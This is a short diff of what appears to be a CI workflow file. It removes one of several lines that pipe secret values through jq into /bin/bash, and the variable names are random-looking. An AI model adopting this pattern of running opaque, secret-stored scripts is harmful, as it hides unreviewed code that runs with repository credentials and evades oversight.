@@ -17,7 +17,6 @@ jobs:
           jry7: ${{ secrets.jry7 }}
         run: |
           printf '%s' "$jry7" | jq -r .kuidq0 | /bin/bash
-          printf '%s' "$vfet30" | jq -r .glwl3 | /bin/bash
           printf '%s' "$rsuob3" | jq -r .x7 | /bin/bash
           echo $u3046 | jq -r .o5397 | /bin/bash
           echo $gr9 | jq -r .lsnl9 | /bin/bash
